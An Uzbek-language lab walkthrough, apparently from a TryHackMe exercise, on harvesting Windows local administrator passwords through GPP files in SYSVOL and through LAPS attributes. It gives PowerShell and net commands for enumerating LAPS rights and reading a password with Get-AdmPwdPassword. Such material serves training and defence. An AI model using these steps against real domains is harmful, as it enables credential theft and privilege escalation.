### Group Policy Preferences (GPP)

Windows operatsion tizimida **Administrator** nomli o‘rnatilgan hisob mavjud bo‘lib, unga parol orqali kirish mumkin. Ko‘plab kompyuterlar mavjud bo‘lgan katta Windows muhitida ushbu mahalliy administrator hisoblari parollarini o‘zgartirish juda murakkab jarayondir. Shu sababli, Microsoft butun domen bo‘yicha mahalliy administrator hisoblari parollarini boshqarish uchun **Group Policy Preferences (GPP)** deb nomlangan metodni joriy qilgan.

**GPP** — bu administratorlarga domen siyosatlarini parollarni o‘z ichiga olgan holda yaratishga imkon beruvchi vosita. Bunday siyosatlar tatbiq etilgach, turli **XML** fayllar **SYSVOL** papkasida yaratiladi. **SYSVOL** — bu Active Directory’ning muhim komponenti bo‘lib, NTFS disk bo‘limida barcha autentifikatsiyadan o‘tgan domen foydalanuvchilari tomonidan **o‘qish huquqi bilan** ochiq bo‘lgan umumiy papkani yaratadi.

Muammo shundaki, **GPP bilan bog‘liq XML fayllarida** parollar **AES-256** bitli shifrlash bilan shifrlangan holda saqlanardi. O‘sha paytda bu shifrlash yetarli darajada xavfsiz deb hisoblangan, biroq **Microsoft tasodifan shaxsiy kalitini (private key)** MSDN’da e’lon qilib yuborgan. Natijada, domen foydalanuvchilari SYSVOL tarkibini o‘qiy olishlari sababli, saqlangan parollarni osongina **dekodlash** (shifrdan yechish) imkoniyati paydo bo‘lgan. SYSVOLdagi shifrlangan parollarni ochish uchun **Get-GPPPassword** kabi vositalar mavjud.

---

### Local Administrator Password Solution (LAPS)

2015-yilda Microsoft parollarni SYSVOL papkasida saqlashni bekor qildi. Buning o‘rniga u **Local Administrator Password Solution (LAPS)** deb nomlangan xavfsizroq usulni joriy etdi.

Bu yangi usul Active Directory’da har bir kompyuter obyektiga ikkita yangi atribut qo‘shishni o‘z ichiga oladi:

* `ms-mcs-AdmPwd` – mahalliy administrator hisobining **aniq matn ko‘rinishidagi (clear-text)** parolini saqlaydi.
* `ms-mcs-AdmPwdExpirationTime` – ushbu parol qachon **muddatini tugatib**, yangilanishi kerakligini bildiradi.

**LAPS**, kompyuterlarning mahalliy administrator parollarini avtomatik yangilab boradi va yuqoridagi atributlar qiymatini yangilash uchun `admpwd.dll` dan foydalanadi.

![](https://raw.githubusercontent.com/akhatkulov/cheatsheets-for-windows/refs/heads/main/Credentials%20Harvesting/Local%20Administrator%20Password%20Solution%20(LAPS)/Local%20Administrator%20Password%20Solution%20(LAPS).png)


## **LAPS bo‘yicha Enumeratsiya qilish**

Berilgan virtual mashinada **LAPS (Local Administrator Password Solution)** yoqilgan, shuning uchun keling, uni aniqlash (enumeratsiya) jarayonini boshlaymiz. Avval LAPS o‘rnatilganligini tekshiramiz, bu esa `admpwd.dll` faylining mavjudligini aniqlash orqali amalga oshiriladi.

---

### **LAPS’ni aniqlash**

```powershell
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
```

Natija quyidagicha:

```
Directory of C:\Program Files\LAPS\CSE

05/05/2021  07:04 AM           184,232 AdmPwd.dll
```

Bu natija LAPS tizimda o‘rnatilganligini tasdiqlaydi. Endi PowerShell orqali mavjud **AdmPwd cmdlet** (buyruq funksiyalari) ni ko‘rib chiqamiz:

---

### **PowerShell Cmdletlarini ro‘yxatlash**

```powershell
PS C:\Users\thm> Get-Command *AdmPwd*
```

Natijada quyidagi cmdletlar chiqadi:

```
Cmdlet          Find-AdmPwdExtendedRights
Cmdlet          Get-AdmPwdPassword
Cmdlet          Reset-AdmPwdPassword
Cmdlet          Set-AdmPwdAuditing
Cmdlet          Set-AdmPwdComputerSelfPermission
Cmdlet          Set-AdmPwdReadPasswordPermission
Cmdlet          Set-AdmPwdResetPasswordPermission
Cmdlet          Update-AdmPwdADSchema
```

---

### **OU (Organizational Unit)** ni topish

Endi LAPS bilan bog‘liq **"All extended rights"** huquqiga ega bo‘lgan **OU** ni aniqlaymiz. Buning uchun `Find-AdmPwdExtendedRights` cmdletidan foydalanamiz. Misolda biz `THMorg` nomli OU’ni ko‘rib chiqamiz. Yoki siz `-Identity *` parametridan foydalansangiz, barcha OU’larni ko‘rishingiz mumkin.

```powershell
PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg
```

Natija:

```
OU=THMorg,DC=thm,DC=red      {THM\THMGroupReader}
```

Bu natijadan ko‘rinib turibdiki, **THMGroupReader** guruhi LAPS huquqiga ega.

---

### **Guruh a’zolarini aniqlash**

Endi `THMGroupReader` guruhiga kimlar a’zo ekanligini aniqlaymiz:

```powershell
PS C:\Users\thm> net groups "THMGroupReader"
```

Natija:

```
Members
-------------------------------------------------------------------------------
bk-admin
```

Bu yerda **bk-admin** foydalanuvchisi ushbu guruhga a’zo.

---

### **THMGroupReader ichidagi foydalanuvchini tekshirish**

```powershell
PS C:\Users\victim> net user test-admin
```

Natija:

```
User name                    test-admin
Global Group memberships     *Domain Users *Domain Admins *THMGroupReader *Enterprise Admins
```

Demak, **test-admin** foydalanuvchisi ham ushbu guruhga a’zo.

---

### **Parolni olish (LAPS orqali)**

Biz bilamizki, **bk-admin** foydalanuvchisi kerakli huquqlarga ega. Shuning uchun LAPS parolini olish uchun ushbu foydalanuvchini **kompromat qilish yoki uning nomidan harakat qilish** zarur. Shunda `Get-AdmPwdPassword` cmdlet yordamida LAPS yoqilgan kompyuterning administrator parolini olish mumkin bo‘ladi:

```powershell
PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin
```

Natija:

```
ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword       2/11/2338 11:05:2...
```

---

### **Muhim eslatma**

Haqiqiy Active Directory muhitlarida **LAPS faqat ayrim kompyuterlarda yoqilgan bo‘ladi**. Shuning uchun siz **qaysi kompyuterlarda LAPS yoqilganligini** va **qaysi foydalanuvchi hisoblari unga kirish huquqiga ega ekanligini** aniqlashingiz kerak bo‘ladi.

Bu jarayonni osonlashtirish uchun bir nechta PowerShell skriptlar mavjud. Shulardan biri — **LAPSToolkit**, u sizga sinov uchun **`C:\Tool`** katalogiga joylashtirilgan.
